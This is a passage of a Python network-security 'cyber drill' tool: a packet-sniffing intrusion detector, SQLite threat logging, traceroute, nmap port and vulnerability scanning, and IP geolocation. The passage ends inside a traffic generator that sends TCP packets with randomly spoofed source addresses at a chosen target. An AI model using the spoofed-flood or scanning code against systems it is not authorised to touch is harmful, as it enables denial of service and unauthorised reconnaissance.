"""
ACCURATE CYBER DRILL TOOL - ENHANCED EDITION
Author: Ian Carter Kulani
Version: 2.0.0
Integrated Features: Network Monitoring, Intrusion Detection, Traffic Generation, 
                     Threat Analysis, Telegram Integration, Advanced Scanning
"""

import sys
import os
import time
import json
import logging
import configparser
from typing import Dict, List, Set, Tuple, Optional, Any
from pathlib import Path
from datetime import datetime
import threading
import queue
import argparse

import signal
import hashlib
import base64
import zipfile
import tempfile

# Core imports
import socket
import subprocess
import requests
import random
import platform
import psutil
import getpass
import sqlite3
import ipaddress
import re
import shutil

# GUI imports
try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog, scrolledtext
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

try:
    import matplotlib.pyplot as plt
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

# Security imports
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import dpkt
    DPKT_AVAILABLE = True
except ImportError:
    DPKT_AVAILABLE = False

# Constants
VERSION = "2.0.0"
AUTHOR = "Cyber Security War Tool Team"
DEFAULT_CONFIG_FILE = "config.ini"
DATABASE_FILE = "network_threats.db"
REPORT_DIR = "reports"
HISTORY_FILE = "command_history.txt"
MAX_HISTORY = 1000
TELEGRAM_API_URL = "https://api.telegram.org/bot"

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

THEMES = {
    "dark": {
        "bg": "#121212",
        "fg": "#00ff00",
        "text_bg": "#222222",
        "text_fg": "#ffffff",
        "button_bg": "#333333",
        "button_fg": "#00ff00",
        "highlight": "#006600"
    },
    "light": {
        "bg": "#f0f0f0",
        "fg": "#000000",
        "text_bg": "#ffffff",
        "text_fg": "#000000",
        "button_bg": "#e0e0e0",
        "button_fg": "#000000",
        "highlight": "#a0a0a0"
    }
}

class TracerouteTool:
    """Enhanced interactive traceroute tool"""
    
    @staticmethod
    def is_ipv4_or_ipv6(address: str) -> bool:
        """Check if input is valid IPv4 or IPv6 address"""
        try:
            ipaddress.ip_address(address)
            return True
        except ValueError:
            return False

    @staticmethod
    def is_valid_hostname(name: str) -> bool:
        """Check if input is valid hostname"""
        if name.endswith('.'):
            name = name[:-1]
        HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)(?!-)([A-Za-z0-9-]{1,63}\.)*[A-Za-z0-9-]{1,63}$")
        return bool(HOSTNAME_RE.match(name))

    @staticmethod
    def choose_traceroute_cmd(target: str) -> List[str]:
        """Return appropriate traceroute command for the system"""
        system = platform.system()

        if system == 'Windows':
            return ['tracert', '-d', target]

        # On Unix-like systems
        if shutil.which('traceroute'):
            return ['traceroute', '-n', '-q', '1', '-w', '2', target]
        if shutil.which('tracepath'):
            return ['tracepath', target]
        if shutil.which('ping'):
            return ['ping', '-c', '4', target]

        raise EnvironmentError('No traceroute utilities found')

    @staticmethod
    def stream_subprocess(cmd: List[str]) -> Tuple[int, str]:
        """Run subprocess and capture output"""
        output_lines = []
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

            if proc.stdout:
                for line in proc.stdout:
                    cleaned_line = line.rstrip()
                    output_lines.append(cleaned_line)
                    print(cleaned_line)

            proc.wait()
            return proc.returncode, '\n'.join(output_lines)
        except KeyboardInterrupt:
            print('\n[+] User cancelled traceroute...')
            try:
                proc.terminate()
            except Exception:
                pass
            return -1, '\n'.join(output_lines)
        except Exception as e:
            error_msg = f'[!] Error: {e}'
            print(error_msg)
            output_lines.append(error_msg)
            return -2, '\n'.join(output_lines)

    def interactive_traceroute(self, target: str = None) -> str:
        """Run interactive traceroute with validation"""
        if not target:
            target = self.prompt_target()
            if not target:
                return "Traceroute cancelled."

        if not (self.is_ipv4_or_ipv6(target) or self.is_valid_hostname(target)):
            return f"❌ Invalid IP address or hostname: {target}"

        try:
            cmd = self.choose_traceroute_cmd(target)
        except EnvironmentError as e:
            return f"❌ Traceroute error: {e}"

        print(f'Running: {" ".join(cmd)}\n')
        
        start_time = time.time()
        returncode, output = self.stream_subprocess(cmd)
        execution_time = time.time() - start_time

        result = f"🛣️ <b>Traceroute to {target}</b>\n\n"
        result += f"Command: <code>{' '.join(cmd)}</code>\n"
        result += f"Execution time: {execution_time:.2f}s\n"
        result += f"Return code: {returncode}\n\n"
        
        if len(output) > 3000:
            result += f"<code>{output[-3000:]}</code>"
        else:
            result += f"<code>{output}</code>"

        return result

    def prompt_target(self) -> Optional[str]:
        """Prompt user for target"""
        while True:
            user_input = input('Enter target IP/hostname (or "quit"): ').strip()
            if not user_input:
                print('Please enter a value.')
                continue
            if user_input.lower() in ('q', 'quit', 'exit'):
                return None

            if self.is_ipv4_or_ipv6(user_input) or self.is_valid_hostname(user_input):
                return user_input
            else:
                print('Invalid IP/hostname. Examples: 8.8.8.8, example.com')

class DatabaseManager:
    """Manage SQLite database for network data"""
    
    def __init__(self):
        self.db_file = DATABASE_FILE
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Original tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitored_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL,
                threat_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                resolved BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS intrusion_detection (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT NOT NULL,
                threat_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                packet_count INTEGER,
                description TEXT,
                action_taken TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS network_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                packets_processed INTEGER,
                packet_rate REAL,
                tcp_count INTEGER,
                udp_count INTEGER,
                icmp_count INTEGER,
                threat_count INTEGER
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS session_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                data_type TEXT NOT NULL,
                data TEXT,
                created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # New tables from provided code
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip_address TEXT NOT NULL,
                threat_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                port INTEGER,
                protocol TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitoring (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TEXT NOT NULL,
                status TEXT NOT NULL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history_full (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                command TEXT NOT NULL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS telegram_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                chat_id TEXT,
                message TEXT,
                direction TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT,
                target TEXT,
                packets_sent INTEGER,
                duration REAL
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_command(self, command: str, source: str = 'local', success: bool = True):
        """Log command to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO command_history (command, source, success) VALUES (?, ?, ?)',
            (command, source, success)
        )
        conn.commit()
        conn.close()
    
    def log_intrusion(self, source_ip: str, threat_type: str, severity: str, 
                     packet_count: int = 0, description: str = "", action: str = "logged"):
        """Log intrusion detection event"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO intrusion_detection 
               (source_ip, threat_type, severity, packet_count, description, action_taken) 
               VALUES (?, ?, ?, ?, ?, ?)''',
            (source_ip, threat_type, severity, packet_count, description, action)
        )
        conn.commit()
        conn.close()
    
    def log_network_stats(self, stats: Dict[str, Any]):
        """Log network statistics"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO network_stats 
               (packets_processed, packet_rate, tcp_count, udp_count, icmp_count, threat_count)
               VALUES (?, ?, ?, ?, ?, ?)''',
            (stats.get('packets_processed', 0),
             stats.get('packet_rate', 0),
             stats.get('tcp_count', 0),
             stats.get('udp_count', 0),
             stats.get('icmp_count', 0),
             stats.get('threat_count', 0))
        )
        conn.commit()
        conn.close()
    
    def log_threat(self, ip_address: str, threat_type: str, severity: str, 
                  description: str = "", port: int = None, protocol: str = None):
        """Log security threat to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO threats 
               (timestamp, ip_address, threat_type, severity, description, port, protocol) 
               VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (datetime.now().isoformat(), ip_address, threat_type, severity, description, port, protocol)
        )
        conn.commit()
        conn.close()
    
    def get_recent_intrusions(self, limit: int = 50) -> List[Tuple]:
        """Get recent intrusion detection events"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            '''SELECT timestamp, source_ip, threat_type, severity, description 
               FROM intrusion_detection 
               ORDER BY timestamp DESC LIMIT ?''',
            (limit,)
        )
        results = cursor.fetchall()
        conn.close()
        return results
    
    def get_threat_stats(self, hours: int = 24) -> Dict[str, int]:
        """Get threat statistics for specified period"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT threat_type, COUNT(*) as count 
            FROM intrusion_detection 
            WHERE timestamp > datetime('now', ?)
            GROUP BY threat_type
        ''', (f'-{hours} hours',))
        
        results = cursor.fetchall()
        conn.close()
        
        stats = {}
        for threat_type, count in results:
            stats[threat_type] = count
        
        return stats
    
    def get_all_threats(self, limit: int = 100) -> List[Tuple]:
        """Get all threats from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            '''SELECT timestamp, ip_address, threat_type, severity, description, port 
               FROM threats 
               ORDER BY timestamp DESC LIMIT ?''',
            (limit,)
        )
        results = cursor.fetchall()
        conn.close()
        return results
    
    def add_monitored_ip(self, ip_address: str):
        """Add IP to monitoring table"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR REPLACE INTO monitoring (ip_address, added_date, status) VALUES (?, ?, ?)",
            (ip_address, datetime.now().isoformat(), 'active')
        )
        conn.commit()
        conn.close()
    
    def remove_monitored_ip(self, ip_address: str):
        """Remove IP from monitoring table"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM monitoring WHERE ip_address = ?", (ip_address,))
        conn.commit()
        conn.close()
    
    def get_monitored_ips(self) -> List[str]:
        """Get list of monitored IPs"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT ip_address FROM monitoring WHERE status = 'active'")
        results = [row[0] for row in cursor.fetchall()]
        conn.close()
        return results

class ThreatDetector:
    """Advanced threat detection system"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db_manager = db_manager
        self.ip_stats = {}
        self.port_stats = {}
        self.syn_flood_stats = {}
        self.detection_thresholds = {
            'DOS': 1000,  # packets per second
            'PortScan': 50,  # unique ports in 60 seconds
            'SYNFlood': 500,  # SYN packets without ACK
            'UDPFlood': 1000,  # UDP packets per second
            'ICMPFlood': 500,  # ICMP packets per second
            'BruteForce': 100  # failed connection attempts
        }
        
    def analyze_packet(self, packet):
        """Analyze packet for threats"""
        threats = []
        
        if IP in packet:
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            
            # Initialize stats for IP
            if ip_src not in self.ip_stats:
                self.ip_stats[ip_src] = {
                    'packet_count': 0,
                    'last_seen': time.time(),
                    'ports_accessed': set(),
                    'packet_times': [],
                    'syn_count': 0
                }
            
            ip_stat = self.ip_stats[ip_src]
            ip_stat['packet_count'] += 1
            ip_stat['last_seen'] = time.time()
            ip_stat['packet_times'].append(time.time())
            
            # Keep only last minute of packet times
            cutoff = time.time() - 60
            ip_stat['packet_times'] = [t for t in ip_stat['packet_times'] if t > cutoff]
            
            # Protocol-specific analysis
            if TCP in packet:
                threats.extend(self._analyze_tcp(packet, ip_src))
            elif UDP in packet:
                threats.extend(self._analyze_udp(packet, ip_src))
            elif ICMP in packet:
                threats.extend(self._analyze_icmp(packet, ip_src))
            
            # General threat detection
            threats.extend(self._detect_dos(ip_src))
            threats.extend(self._detect_port_scan(ip_src))
        
        return threats
    
    def _analyze_tcp(self, packet, ip_src):
        """Analyze TCP packets"""
        threats = []
        tcp = packet[TCP]
        
        # Track ports accessed
        self.ip_stats[ip_src]['ports_accessed'].add(tcp.dport)
        
        # SYN flood detection
        if tcp.flags & 0x02:  # SYN flag
            self.ip_stats[ip_src]['syn_count'] += 1
            
            if ip_src not in self.syn_flood_stats:
                self.syn_flood_stats[ip_src] = {'syn_count': 0, 'start_time': time.time()}
            
            self.syn_flood_stats[ip_src]['syn_count'] += 1
            
            # Check for SYN flood
            syn_stats = self.syn_flood_stats[ip_src]
            elapsed = time.time() - syn_stats['start_time']
            if elapsed > 0:
                syn_rate = syn_stats['syn_count'] / elapsed
                if syn_rate > self.detection_thresholds['SYNFlood']:
                    threats.append({
                        'type': 'SYNFlood',
                        'source': ip_src,
                        'severity': 'high',
                        'rate': syn_rate
                    })
        
        return threats
    
    def _analyze_udp(self, packet, ip_src):
        """Analyze UDP packets"""
        threats = []
        udp = packet[UDP]
        
        # Track UDP packet rate
        udp_rate = len([t for t in self.ip_stats[ip_src]['packet_times'] 
                       if time.time() - t < 1])
        
        if udp_rate > self.detection_thresholds['UDPFlood']:
            threats.append({
                'type': 'UDPFlood',
                'source': ip_src,
                'severity': 'medium',
                'rate': udp_rate
            })
        
        return threats
    
    def _analyze_icmp(self, packet, ip_src):
        """Analyze ICMP packets"""
        threats = []
        
        # Track ICMP packet rate
        icmp_rate = len([t for t in self.ip_stats[ip_src]['packet_times'] 
                        if time.time() - t < 1])
        
        if icmp_rate > self.detection_thresholds['ICMPFlood']:
            threats.append({
                'type': 'ICMPFlood',
                'source': ip_src,
                'severity': 'medium',
                'rate': icmp_rate
            })
        
        return threats
    
    def _detect_dos(self, ip_src):
        """Detect DOS attacks"""
        threats = []
        
        ip_stat = self.ip_stats[ip_src]
        if len(ip_stat['packet_times']) > 0:
            time_window = ip_stat['packet_times'][-1] - ip_stat['packet_times'][0]
            if time_window > 0:
                packet_rate = len(ip_stat['packet_times']) / time_window
                if packet_rate > self.detection_thresholds['DOS']:
                    threats.append({
                        'type': 'DOS',
                        'source': ip_src,
                        'severity': 'high',
                        'rate': packet_rate
                    })
        
        return threats
    
    def _detect_port_scan(self, ip_src):
        """Detect port scanning"""
        threats = []
        
        ip_stat = self.ip_stats[ip_src]
        unique_ports = len(ip_stat['ports_accessed'])
        
        if unique_ports > self.detection_thresholds['PortScan']:
            threats.append({
                'type': 'PortScan',
                'source': ip_src,
                'severity': 'medium',
                'ports': unique_ports
            })
        
        return threats
    
    def clear_old_stats(self, max_age: int = 300):
        """Clear statistics older than max_age seconds"""
        cutoff = time.time() - max_age
        ips_to_remove = []
        
        for ip, stats in self.ip_stats.items():
            if stats['last_seen'] < cutoff:
                ips_to_remove.append(ip)
        
        for ip in ips_to_remove:
            del self.ip_stats[ip]
            
        # Clean SYN flood stats
        syn_ips_to_remove = []
        for ip, stats in self.syn_flood_stats.items():
            if stats['start_time'] < cutoff:
                syn_ips_to_remove.append(ip)
        
        for ip in syn_ips_to_remove:
            del self.syn_flood_stats[ip]

class NetworkMonitor:
    """Network monitoring with threat detection"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db_manager = db_manager
        self.threat_detector = ThreatDetector(db_manager)
        self.is_monitoring = False
        self.sniffer_thread = None
        self.packet_queue = queue.Queue()
        self.target_ip = None
        self.packet_count = 0
        self.start_time = None
        self.stats = {
            'tcp_count': 0,
            'udp_count': 0,
            'icmp_count': 0,
            'threat_count': 0
        }
    
    def start_monitoring(self, target_ip: str = None):
        """Start network monitoring"""
        if self.is_monitoring:
            return False
        
        self.target_ip = target_ip
        self.is_monitoring = True
        self.packet_count = 0
        self.start_time = time.time()
        self.stats = {'tcp_count': 0, 'udp_count': 0, 'icmp_count': 0, 'threat_count': 0}
        
        # Start packet capture thread
        self.sniffer_thread = threading.Thread(
            target=self._packet_capture_loop,
            daemon=True
        )
        self.sniffer_thread.start()
        
        # Start packet processing thread
        self.processor_thread = threading.Thread(
            target=self._packet_processing_loop,
            daemon=True
        )
        self.processor_thread.start()
        
        # Start stats logging thread
        self.stats_thread = threading.Thread(
            target=self._stats_logging_loop,
            daemon=True
        )
        self.stats_thread.start()
        
        return True
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.is_monitoring = False
        
        if self.sniffer_thread and self.sniffer_thread.is_alive():
            self.sniffer_thread.join(timeout=2)
        if self.processor_thread and self.processor_thread.is_alive():
            self.processor_thread.join(timeout=2)
        if self.stats_thread and self.stats_thread.is_alive():
            self.stats_thread.join(timeout=2)
    
    def _packet_capture_loop(self):
        """Capture packets from network"""
        try:
            filter_str = f"host {self.target_ip}" if self.target_ip else ""
            sniff(
                filter=filter_str,
                prn=lambda p: self.packet_queue.put(p),
                store=0,
                stop_filter=lambda _: not self.is_monitoring
            )
        except Exception as e:
            print(f"Packet capture error: {e}")
    
    def _packet_processing_loop(self):
        """Process captured packets for threats"""
        while self.is_monitoring or not self.packet_queue.empty():
            try:
                packet = self.packet_queue.get(timeout=1)
                self.packet_count += 1
                
                # Update protocol stats
                if TCP in packet:
                    self.stats['tcp_count'] += 1
                elif UDP in packet:
                    self.stats['udp_count'] += 1
                elif ICMP in packet:
                    self.stats['icmp_count'] += 1
                
                # Detect threats
                threats = self.threat_detector.analyze_packet(packet)
                if threats:
                    self.stats['threat_count'] += len(threats)
                    for threat in threats:
                        self.db_manager.log_intrusion(
                            source_ip=threat['source'],
                            threat_type=threat['type'],
                            severity=threat['severity'],
                            description=f"Rate: {threat.get('rate', 'N/A')}"
                        )
                        self.db_manager.log_threat(
                            ip_address=threat['source'],
                            threat_type=threat['type'],
                            severity=threat['severity'],
                            description=f"Rate: {threat.get('rate', 'N/A')}"
                        )
                
                # Clean old stats periodically
                if self.packet_count % 1000 == 0:
                    self.threat_detector.clear_old_stats()
                    
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Packet processing error: {e}")
    
    def _stats_logging_loop(self):
        """Periodically log network statistics"""
        while self.is_monitoring:
            time.sleep(60)  # Log every minute
            
            uptime = time.time() - self.start_time
            if uptime > 0:
                stats = {
                    'packets_processed': self.packet_count,
                    'packet_rate': self.packet_count / uptime,
                    'tcp_count': self.stats['tcp_count'],
                    'udp_count': self.stats['udp_count'],
                    'icmp_count': self.stats['icmp_count'],
                    'threat_count': self.stats['threat_count']
                }
                self.db_manager.log_network_stats(stats)
    
    def get_current_stats(self) -> Dict[str, Any]:
        """Get current monitoring statistics"""
        uptime = time.time() - self.start_time if self.start_time else 0
        packet_rate = self.packet_count / uptime if uptime > 0 else 0
        
        return {
            'is_monitoring': self.is_monitoring,
            'target_ip': self.target_ip,
            'packets_processed': self.packet_count,
            'uptime': uptime,
            'packet_rate': packet_rate,
            'tcp_packets': self.stats['tcp_count'],
            'udp_packets': self.stats['udp_count'],
            'icmp_packets': self.stats['icmp_count'],
            'threats_detected': self.stats['threat_count']
        }

class NetworkScanner:
    """Network scanning capabilities"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db_manager = db_manager
        self.traceroute_tool = TracerouteTool()
        if NMAP_AVAILABLE:
            self.nm = nmap.PortScanner()
        else:
            self.nm = None
    
    def ping_ip(self, ip: str) -> str:
        """Comprehensive ping with analysis"""
        try:
            # Validate IP address
            try:
                socket.inet_aton(ip)
            except socket.error:
                return f"❌ Invalid IP address: {ip}"
            
            # Method 1: Using system ping command
            param = "-n" if platform.system().lower() == "windows" else "-c"
            command = ["ping", param, "4", ip]
            
            result = subprocess.run(command, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                response = f"✅ {ip} is reachable\n\n"
                
                # Extract ping statistics
                lines = result.stdout.split('\n')
                for line in lines:
                    if "time=" in line or "time<" in line:
                        response += f"  Response: {line.strip()}\n"
                
                # Additional network analysis
                response += self.analyze_network_health(ip)
                return response
            else:
                return f"❌ {ip} is not reachable"
                
        except subprocess.TimeoutExpired:
            return f"❌ Ping timeout for {ip}"
        except Exception as e:
            return f"❌ Ping error: {str(e)}"
    
    def analyze_network_health(self, ip_address: str) -> str:
        """Perform additional network health analysis"""
        response = ""
        try:
            # DNS resolution test
            start_time = time.time()
            try:
                hostname = socket.gethostbyaddr(ip_address)[0]
                dns_time = time.time() - start_time
                response += f"  DNS Resolution: {hostname} ({dns_time:.3f}s)\n"
            except:
                response += "  DNS Resolution: Failed\n"
            
            # Port connectivity quick test
            common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995]
            open_ports = []
            
            for port in common_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip_address, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
            
            if open_ports:
                response += f"  Open common ports: {open_ports}\n"
            else:
                response += "  No common ports open\n"
                
        except Exception as e:
            response += f"  Network health analysis error: {e}\n"
        
        return response
    
    def scan_ip(self, ip: str) -> Dict[str, Any]:
        """Quick port scan on common ports"""
        try:
            common_ports = [21, 22, 23, 25, 53, 80, 110, 113, 135, 139, 143, 443, 
                          445, 993, 995, 1723, 3306, 3389, 5900, 8080]
            
            results = {
                'success': True,
                'ip': ip,
                'scan_time': datetime.now().isoformat(),
                'open_ports': [],
                'services': {}
            }
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        service_name = self.get_service_name(port)
                        results['open_ports'].append(port)
                        results['services'][port] = service_name
                        
                except Exception:
                    continue
            
            return results
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def deep_scan_ip(self, ip: str) -> Dict[str, Any]:
        """Comprehensive port scan (1-65535)"""
        if not self.nm:
            return {'success': False, 'error': 'Nmap not available'}
        
        try:
            self.nm.scan(ip, '1-65535', arguments='-sS -T4')
            
            if ip in self.nm.all_hosts():
                host = self.nm[ip]
                results = {
                    'success': True,
                    'ip': ip,
                    'scan_time': datetime.now().isoformat(),
                    'state': host.state(),
                    'open_ports': [],
                    'services': {}
                }
                
                for proto in host.all_protocols():
                    ports = host[proto].keys()
                    for port in ports:
                        service_info = host[proto][port]
                        results['open_ports'].append(port)
                        results['services'][port] = {
                            'name': service_info.get('name', 'unknown'),
                            'product': service_info.get('product', ''),
                            'version': service_info.get('version', ''),
                            'state': service_info.get('state', '')
                        }
                
                return results
            else:
                return {'success': False, 'error': f'Host {ip} not found in scan results'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_service_name(self, port: int) -> str:
        """Get service name for common ports"""
        service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 113: "Ident", 135: "RPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Proxy"
        }
        return service_map.get(port, "Unknown")
    
    def traceroute(self, target: str) -> str:
        """Perform enhanced traceroute"""
        return self.traceroute_tool.interactive_traceroute(target)
    
    def port_scan(self, ip: str, ports: str = "1-1000") -> Dict[str, Any]:
        """Perform port scan using nmap"""
        if self.nm:
            try:
                self.nm.scan(ip, ports, arguments='-T4')
                open_ports = []
                
                if ip in self.nm.all_hosts():
                    for proto in self.nm[ip].all_protocols():
                        lport = self.nm[ip][proto].keys()
                        for port in lport:
                            if self.nm[ip][proto][port]['state'] == 'open':
                                open_ports.append({
                                    'port': port,
                                    'state': self.nm[ip][proto][port]['state'],
                                    'service': self.nm[ip][proto][port].get('name', 'unknown')
                                })
                
                # Log to database
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                cursor.execute(
                    'INSERT INTO scan_results (ip_address, scan_type, open_ports, services) VALUES (?, ?, ?, ?)',
                    (ip, 'nmap', json.dumps([p['port'] for p in open_ports]), 
                     json.dumps([p['service'] for p in open_ports]))
                )
                conn.commit()
                conn.close()
                
                return {
                    'success': True,
                    'target': ip,
                    'open_ports': open_ports,
                    'scan_time': datetime.now().isoformat()
                }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': 'Nmap not available'}
    
    def get_ip_location(self, ip: str) -> str:
        """Get IP location using ip-api.com and ipinfo.io"""
        try:
            location_data = {}
            
            # Try ipapi.co first
            try:
                response = requests.get(f"http://ipapi.co/{ip}/json/", timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if 'error' not in data:
                        location_data = {
                            'country': data.get('country_name', 'Unknown'),
                            'region': data.get('region', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'isp': data.get('org', 'Unknown'),
                            'timezone': data.get('timezone', 'Unknown'),
                            'coordinates': f"{data.get('latitude', 'Unknown')}, {data.get('longitude', 'Unknown')}"
                        }
            except:
                pass
            
            # If ipapi.co fails, try ipinfo.io
            if not location_data:
                try:
                    response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
                    if response.status_code == 200:
                        data = response.json()
                        location_data = {
                            'country': data.get('country', 'Unknown'),
                            'region': data.get('region', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'isp': data.get('org', 'Unknown'),
                            'timezone': data.get('timezone', 'Unknown'),
                            'coordinates': data.get('loc', 'Unknown')
                        }
                except:
                    pass
            
            if location_data:
                result = f"📍 Location information for {ip}:\n"
                for key, value in location_data.items():
                    result += f"  {key.title()}: {value}\n"
                return result
            else:
                return "❌ Unable to retrieve location information"
                
        except Exception as e:
            return f"❌ Location lookup error: {str(e)}"
    
    def vulnerability_scan(self, target: str) -> Dict[str, Any]:
        """Perform vulnerability scan"""
        if not self.nm:
            return {'success': False, 'error': 'Nmap not available'}
        
        try:
            self.nm.scan(target, arguments='--script vuln')
            
            vulns = []
            if target in self.nm.all_hosts():
                for script in self.nm[target].get('scripts', []):
                    if 'vuln' in script.lower():
                        vulns.append(script)
            
            return {
                'success': True,
                'target': target,
                'vulnerabilities': vulns,
                'scan_time': datetime.now().isoformat()
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

class NetworkTrafficGenerator:
    """Network traffic generation capabilities"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db_manager = db_manager
        self.running = False
        self.current_thread = None
    
    def generate_tcp_traffic(self, target_ip: str, port: int, packet_count: int, delay: float) -> str:
        """Generate TCP traffic"""
        if not SCAPY_AVAILABLE:
            return "❌ Scapy not available for TCP traffic generation"
        
        try:
            packets_sent = 0
            start_time = time.time()
            
            for i in range(packet_count):
                if not self.running:
                    break
                
                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port)
                send(packet, verbose=0)
                packets_sent += 1
                
                if delay > 0:
                    time.sleep(delay)
            
            duration = time.time() - start_time
            
            # Log to database
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
